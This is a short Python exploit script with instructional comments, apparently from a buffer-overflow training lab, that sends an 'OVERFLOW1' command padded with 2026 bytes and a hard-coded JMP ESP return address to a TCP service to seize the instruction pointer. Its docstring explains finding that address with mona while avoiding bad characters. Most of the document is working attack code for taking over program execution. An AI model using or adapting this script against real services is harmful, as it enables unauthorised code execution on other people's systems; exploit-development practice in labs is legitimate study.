'''
from finding_badchars = got badchars list


1. !mona jmp -r esp -cpb "<badchar-list>"

	from results copy first false raw address.
	eg. 0x625011af


	replace this adderss in EIP address.

2. set breakpoint at this address 625011af

3. run script

4. after crashing program EIP should be equal to breakpoint 625011af
'''


import sys,socket
ip = ""
port = 
message = "OVERFLOW1 "
address = "\xaf\x11\x50\x62"													# 	reverse of 625011af
payload = message + "A" * 2026 + address 										#	change A's length 

try:
    s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
    s.connect((ip , port))
    print("Sending payload...")
    s.send(payload)
    s.close()
except:
    print("Cannot connect to server")
    sys.exit()
